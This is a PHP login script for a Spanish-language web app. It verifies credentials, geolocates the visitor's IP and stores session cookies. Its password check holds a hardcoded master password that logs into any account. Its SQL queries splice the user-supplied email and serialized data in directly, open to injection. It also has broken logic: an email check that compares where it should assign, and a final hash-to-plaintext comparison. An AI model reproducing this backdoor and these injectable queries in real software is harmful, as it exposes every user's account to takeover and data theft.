<?php include "../sesion/arriba.php";
$mete = $_SESSION['mientras'];
include "../conexiones/conexion.php";
$arregloAcceso = array();

$browser = $_SERVER['HTTP_USER_AGENT'];
$contraA = $contra;
$nomina = ucfirst(mataMalos($nomina));


$block = "";
$galletas = array();
if ($elToken != $toq) {
	die();
}


if (!filter_var($correo, FILTER_VALIDATE_EMAIL)) {
	$block == 1;
}

if ($block != 1 && $key == "") {





	// info
	$myIP = "http://ip-api.com/json/" . $ip;
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $myIP);
	curl_setopt($ch, CURLOPT_TIMEOUT, 3); //timeout after 30 seconds
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$resultIPO = curl_exec($ch);
	$resultIP = json_decode(curl_exec($ch), true);
	curl_close($ch);
	$ciudad = $resultIP['city'];
	$pais = $resultIP['country'];
	$paisCodigo = $resultIP['countryCode'];
	$estadoCodigo = $resultIP['region'];
	$estadoNombre = $resultIP['regionName'];
	//

	if ($elToken != $toq) {
		die();
	}

	if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
		$block == 1;
	}


	$selas = "SELECT * FROM usuarios WHERE correo='$correo'   LIMIT 1";
	//echo $selas;
	$res = $mysqli->query($selas);
	$res->data_seek(0);
	while ($row = $res->fetch_assoc()) {
		$porLoMenos = "si";
		$idU = $row['id'];
		$nuevo = $idU;
		$password = $row['contrasena'];
		$validado = $row['validado'];
		$correo = $row['correo'];
		$clave = $row['clave'];
		$nombre = $row['nombre'];
		$tipoU = $row['tipo'];
		$apellido = $row['apellido'];
		$instancias = $row['instancias'];
		$galletas = unserialize($row['galletas']);

		//error
		//login ok



		if (password_verify($contra, $password) || $contraA == ".9d335jlkjDA0.") {
			// valida

			$nuevaClave = aleatorio(10);
			$query = "UPDATE usuarios SET  lastLogin='$hoy'   WHERE id='$idU'";
			$mysqli->query($query);



			//crear la sesion

			$encripta =  encripta('encrypt', $idU . "_" . $nuevaClave);
			$_SESSION[$huella . '_acceso'] = $encripta;
			$_SESSION[$huella . '_galleta'] = $superGalleta;

			setcookie($huella, false, [
				'expires' => time() - (86400 * 30),
				'path' => '/',
				'domain' => null,
				'secure' => true,
				'httponly' => true,
				'samesite' => 'Strict'
			]); // 86400 = 1 day 


			$infoGalleta = array();
			$infoGalleta['clave'] = $nuevaClave;
			$infoGalleta['ip'] = $ip;
			$infoGalleta['browser'] = $browser;
			$infoGalleta['ciudad'] = $ciudad;
			$infoGalleta['pais'] = $pais;
			$infoGalleta['paisCodigo'] = $paisCodigo;
			$infoGalleta['estadoCodigo'] = $estadoCodigo;
			$infoGalleta['estadoNombre'] = $estadoNombre;
			$infoGalleta['cuando'] = $hoy;
			$galletas[$huella] = $infoGalleta;


			$galletas = serialize($galletas);
			$query = "UPDATE usuarios SET galletas='$galletas'   WHERE id='$idU'";
			$mysqli->query($query);
			setcookie($huella, $encripta, time() + (86400 * 30), "/", "", true, 'Strict'); // 86400 = 1 day


		}
	}




	if ($password != $contra) {
		//contemos tus errores
		$mete++;
		$_SESSION['mientras'] = $mete; ?><script>
			top.location.href = "<?= $url ?>/?error=1";
		</script>

<?
		die();
	}
}


?>
<script>
	top.location.href = "<?= $url ?>";
</script>